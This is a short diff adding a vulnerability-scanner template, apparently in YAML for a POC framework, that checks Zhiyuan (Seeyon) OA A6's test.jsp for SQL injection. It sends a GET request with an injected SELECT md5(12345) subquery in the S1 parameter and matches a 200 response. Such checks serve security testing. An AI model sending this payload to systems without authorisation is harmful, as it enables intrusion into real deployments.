@@ -1,0 +1,11 @@
+name: 致远OA-a6-test-jsp-sql
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(12345))
+    expression:
+      status: 200
+      body_all: ["系统管理员"]
